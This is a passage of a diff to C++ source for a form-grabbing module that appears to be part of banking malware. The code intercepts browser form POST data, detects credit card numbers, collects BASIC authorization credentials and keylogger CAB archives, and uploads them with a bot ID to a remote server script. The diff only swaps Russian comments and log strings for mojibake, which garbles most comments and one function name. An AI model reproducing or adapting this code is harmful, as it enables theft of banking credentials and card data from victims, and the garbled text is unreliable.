 	#ifdef PostDataGrabberH
-		//оповещаем о получении пост данных
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PostDataGrabber::DoEvents( URL, Data );
 	#endif
 
@@ -1721,22 +1732,22 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
         PrivatBank::CheckPostData(URL, Data);
 	#endif
 
-	// Добавить данные HTML формы
-	LDBG("Loader", "Добавляем в хранилище HTML данные");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅ
+	LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ");
 	
-	// Проверяем макимальный размер данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (StrCalcLength(Data) > MAX_FORM_GRABBER_DATA_SIZE)
 		return false;
 
-	//  Проверяем содержиат и данные номер кредитной карты
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool ContainCard = ContainCreditCardNomber(Data);
 
 	if (ContainCard)
 	{
-    	LDBG("Loader", "Данные содержат номер кредитной карты");
+    	LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
     }
 
-	// Проверяем ссылку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef FgrFiltersH
 		if (!ContainCard)
 		{
@@ -1746,10 +1757,10 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 	#endif
 
 
-	LDBG("Loader", "Данные HTML формы: \r\n%s", Data);
+	LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅ: \r\n%s", Data);
 
 
-    // Добавляем данные
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR SendData = STR::New(3, URL, "?|POST:", Data);
 
 	bool Res = AddData(URL, SendData, UserAgent, Browser, DataType, ContainCard);
@@ -1762,27 +1773,27 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 
 bool DataGrabber::SendDataFile(PCHAR FileName, bool* InvalidFile)
 {
-	// Отправить файл данных на сервер
-	// Функция должна вернуть истину в случае если
-	// данные успешно отправлены либо после работы функции необходимо
-	// удалить файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(FileName))
 		return false;
 
 	LDBG("Loader", "-----------------------------------------------------------");
-    LDBG("Loader", "Отправляем файл данных %s", FileName);
+    LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", FileName);
 
 	PDataFile File = DataFile::OpenFile(FileName, GrabberFileSignature);
 	if (File == NULL)
 	{
-		LDBG("Loader", "Ошибка открытия файла. Код ошибки %d", pGetLastError());
+		LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %d", pGetLastError());
 		return false;
     }
 
-	// Проверяем версию файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (File->Head.Version != DATA_FILE_VERSION)
 	{
-		LDBG("Loader", "Версия файла не поддерживается");
+		LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		DataFile::CloseFile(File);
         return true;
     }
@@ -1794,16 +1805,16 @@ bool DataGrabber::SendDataFile(PCHAR FileName, bool* InvalidFile)
 
 	DataFile::ReadDataFile(File);
 
-	bool Result = true; // Для удаления необработанного файла
+	bool Result = true; // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-	// Вызываем метод отправки файла
-	LDBG("Loader", "Определяем обработчик файда");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 	switch (File->Head.Flags)
 	{
 		case DATA_TYPE_FORM:   Result = SendFormGrabberData(File); break;
 		case DATA_TYPE_INJECT: Result = SendFormGrabberData(File); break;
-        case DATA_TYPE_CAB:    Result = SendСabFromDataFile(File, InvalidFile); break;
-	default: LDBG("Loader", "Неизвестный тип данных");;
+        case DATA_TYPE_CAB:    Result = SendпїЅabFromDataFile(File, InvalidFile); break;
+	default: LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");;
 	}
 
 	//-------------------------------
@@ -1815,14 +1826,14 @@ bool DataGrabber::SendDataFile(PCHAR FileName, bool* InvalidFile)
 
 void DataGrabber::StartDataSender()
 {
-	// Запустить поток отложенной отправки данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
    StartThread(DataSender::DataSenderThreadProc, NULL);
 }
 
 
 void DataGrabber::AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password)
 {
-	// Функция добавляет данные BASIC авторизации для отправки на сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BASIC пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Session == NULL || STR::IsEmpty(Password))
 		return;
 
@@ -1836,9 +1847,9 @@ void DataGrabber::AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR User
 
 bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTML)
 {
-	// Функция отправки HTML данных на удалённый скрипт
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-    LDBG("Loader", "Отправляем HTML данные на сервер. \r\n URL: [%s]", URL);
+    LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. \r\n URL: [%s]", URL);
 
 	if (URL == NULL || Data == NULL)
 		return false;
@@ -1847,7 +1858,7 @@ bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTM
 	PCHAR BT = StrLongToString(Data->BrowserType);
 	PCHAR DT = StrLongToString(Data->DataType);
 
-	// Создаём данные формы
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PStrings S = Strings::Create();
 	AddURLParam(S, "id", Data->BotID);
 	AddURLParam(S, "brw", BT);
@@ -1858,7 +1869,7 @@ bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTM
 
 	STR::Free(BT);
 	STR::Free(DT);
-	// Отправляем форму
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	#ifdef CryptHTTPH
@@ -1877,9 +1888,9 @@ bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTM
     HTTPResponse::Clear(&Response);
 	
 	if (Res)
-		LDBG("Loader", "HTML данные успещно отправлены");
+		LDBG("Loader", "HTML пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	else
-		LDBG("Loader", "Не удалось отправить HTML данные");
+		LDBG("Loader", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	return Res;
 }
@@ -1887,18 +1898,18 @@ bool DataGrabber::SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *HTM
 
 bool DataGrabber::SendFormGrabberData(PDataFile File)
 {
-	// Отправить данные HTML форм
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅ
 	if (File == NULL)
 		return false;
 
-	LDBG("Loader", "Отправляем данные формграбера");
+	LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Отправляем данные HTML форм на сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	TSendHTMLData Data;
 	ClearStruct(Data);
 
-	// Заполняем структуру отправки данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Data.DataType = File->Head.Flags;
 	Data.BrowserType = File->Head.FlagsEx;
 	Data.BotID = GenerateBotID();
@@ -1908,14 +1919,14 @@ bool DataGrabber::SendFormGrabberData(PDataFile File)
 	Data.ContainCard = MEMBLOCK::ContainBlock(File->Blocks, DATA_BLOCK_CARDNOMBER);
 
 
-	// Вызываем обработчики отправки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Cancel = false;
 	CallSendDataHandlers(&Data, Cancel);
 
 	bool R = false;
 	if (!Cancel)
 	{
-		// Отправляем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR Script = GetBotScriptURL(SCRIPT_FORM_GRABBER);
 		R = SendHTMLDataToServer(Script, &Data, NULL);
 		STR::Free(Script);
@@ -1932,7 +1943,7 @@ bool DataGrabber::SendFormGrabberData(PDataFile File)
 
 bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
 {
-	// Отправляем пост запрос на скрипт хранения данных кейлогера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (InvalidFile)
     	*InvalidFile = false;
 
@@ -1941,32 +1952,32 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 
 
 	bool IsBanking = AnsiStr::Hash(AppName) != 0xC797974 /* cert */;
-	// При любой отправке каба включаем режим Банк
-	// игнорируем отправку сертификатов
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (IsBanking)
 		SetBankingMode();
 
 
-	// Уведомляем монитор об отправке каба
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	MONITOR_DELIMETED_MSG(BMCONST(MessageSendCab), AppName, ":", CabFileName);
 
-	// Инициализируем адрес
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool GenerateURL = STRA::IsEmpty(URL);
 	if (GenerateURL)
 		URL = GetBotScriptURL(SCRIPT_CAB, NULL, IsBanking);
 
 	if (STRA::IsEmpty(URL)) return false;
 
-    LDBG("Loader", "Отправляем CAB архив с именем [%s]", AppName);
+    LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CAB пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ [%s]", AppName);
 
-	// Формируем пост данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PMultiPartData Data = MultiPartData::Create();
 	if (Data == NULL) return false;
 
-	// Получаем идентификатор бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PCHAR BotID = GenerateBotID();
 
-	// Добавляем поля
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	MultiPartData::AddStringField(Data, "id", BotID);
 	MultiPartData::AddStringField(Data, "type_name", AppName);
 	MultiPartData::AddFileField(Data, "cab", CabFileName, NULL);
@@ -1978,7 +1989,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 
 	STR::Free(BotID);
 
-	// Отправляем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 
@@ -1987,7 +1998,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	if (Result)
 		Result = CheckValidPostResult(&Response, NULL);
 
-	// Проверяем ошибки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!Result && Response.Code == 404)
 	{
 		if (InvalidFile != NULL)
@@ -1999,7 +2010,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 
 		MONITOR_DELIMETED_MSG(BMCONST(MessageSendCabError), CabFileName, "\r\n", ErrorText);
 
-		LDBG("Loader", "Ошибка отправки CAB архива с именем [%s]\r\nError: %s", AppName, ErrorText);
+		LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CAB пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ [%s]\r\nError: %s", AppName, ErrorText);
 
 		STR::Free(ErrorText);
 	}
@@ -2009,7 +2020,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	MultiPartData::Free(Data);
 
 	if (Result)
-		LDBG("Loader", "CAB [%s] успешно отправлен", AppName);
+		LDBG("Loader", "CAB [%s] пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", AppName);
 
 
 	if (GenerateURL)
@@ -2019,33 +2030,33 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 }
 
 
-bool DataGrabber::SendСabFromDataFile(PDataFile File, bool* InvalidFile)
+bool DataGrabber::SendпїЅabFromDataFile(PDataFile File, bool* InvalidFile)
 {
-	// Метод обработки отложенной отправки CAB архива
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CAB пїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char TempCabName[] = {'s', 'd', 'c', 'a', 'b', 'f', 'i', 'l', 'e', '.', 'c', 'a', 'b',  0};
 
 	if (File == NULL) return false;
 
-	// Получаем данные из файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
    	PMemBlock Cab = MEMBLOCK::GetBlockByID(File->Blocks, DATA_BLOCK_CAB);
-    if (Cab == NULL) return true; // Возвращаем истину для удаления файла
+    if (Cab == NULL) return true; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR URL     = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_URL);
 	PCHAR AppName = MEMBLOCK::GetBlockByAsStr(File->Blocks, DATA_BLOCK_APPNAME);
 
 
-	// Записываем архив во временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PCHAR FileName = GetDataFileName((PCHAR)TempCabName);
 
 	File::WriteBufferA(FileName, Cab->Data, Cab->Size);
 
-	// Отправляем
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = SendCab(URL, FileName, AppName, InvalidFile);
 
-	// Удаляем временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pDeleteFileA(FileName);
 
-	// Уничтожаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free(URL);
 	STR::Free(AppName);
 	STR::Free(FileName);
@@ -2060,16 +2071,16 @@ bool DataGrabber::SendCab(PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
 
 bool DataGrabber::SendCabDelayed(PCHAR URL, PCHAR CabFileName, PCHAR AppName)
 {
-	// Отложенная отправка архива
-	// функция добавляет файл в очередь отправки и возвращает управление
-	// Файл архива дублируется. По этому его можно удалить сразу после
-	// вызова функции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	DWORD CabSize = 0;
 	LPBYTE Data = File::ReadToBufferA(CabFileName, CabSize);
     if (Data == NULL) return false;
 
-	LDBG("Loader", "Отложенная отправка cab архива. Система [%s]", AppName);
+	LDBG("Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ cab пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ [%s]", AppName);
 
 	PDataFile File = CreateDataFile(DATA_TYPE_CAB);
 
